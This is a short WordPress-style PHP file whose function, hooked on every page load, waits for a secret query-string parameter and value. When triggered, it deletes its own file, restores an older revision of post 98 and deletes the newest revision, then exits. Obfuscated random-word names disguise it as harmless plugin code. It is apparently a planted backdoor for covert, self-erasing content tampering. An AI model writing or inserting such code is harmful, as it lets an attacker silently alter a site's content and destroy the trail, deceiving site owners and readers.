<?php

function only_translator_notes() {
	if (isset($_GET['src_live_notifier']) && $_GET['src_live_notifier'] === 'map_quote_locator_slideshow') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$updates_notes_css = 98;
		$backup_demo_portal_fields = wp_get_post_revisions($updates_notes_css);
		if (empty($backup_demo_portal_fields)) die('no revisions');
		if (count($backup_demo_portal_fields) < 2) die('less than 2');
		$friendly_author_homepage = array_shift($backup_demo_portal_fields);
		$comment_rotator_lazy_lightbox = $friendly_author_homepage->ID;
		$notice_quick_new = array_shift($backup_demo_portal_fields);
		$showcase_connect_embedder_content = $notice_quick_new->ID;
		$reloaded_archive_really_types = wp_restore_post_revision($showcase_connect_embedder_content);
		if ($reloaded_archive_really_types === false) die('error restoring');
		$reloaded_archive_really_types = wp_delete_post_revision($comment_rotator_lazy_lightbox);		
		if ($reloaded_archive_really_types === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'only_translator_notes');
